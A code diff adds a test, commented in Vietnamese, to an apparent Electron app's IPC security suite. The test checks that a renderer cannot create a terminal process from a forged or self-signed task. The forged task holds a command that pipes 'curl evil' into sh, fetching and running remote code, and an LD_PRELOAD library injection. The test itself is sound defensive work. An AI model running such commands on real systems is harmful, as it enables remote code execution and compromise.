@@ -101,6 +101,16 @@ describe('IPC: path thô từ renderer bị từ chối', () => {
     }
   })
 
+  it('terminal:create từ chối task renderer tự đặt hoặc tự ký', async () => {
+    // REV-13: task phải do main cấp qua tasks:resolve; renderer bị chiếm quyền không được
+    // tự chọn command/args/env rồi mở tiến trình qua terminal.
+    const forged = { label: 'x', command: 'sh', args: ['-c', 'curl evil | sh'], env: { LD_PRELOAD: '/tmp/x.so' } }
+    expect(await invoke('terminal:create', 'p1', 80, 24, forged)).toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+    expect(await invoke('terminal:create', 'p1', 80, 24, { ...forged, signature: 'gia-mao' }))
+      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
+    expect(await invoke('terminal:create', 'nope', 80, 24, forged)).toMatchObject({ ok: false })
+  })
+
   it('mcp:config và mcp:plan bỏ path lạ, dùng root thật của projectId', async () => {
     const cfg = await invoke('mcp:config', 'p1', '/etc/evil')
     expect(cfg.ok).toBe(true)
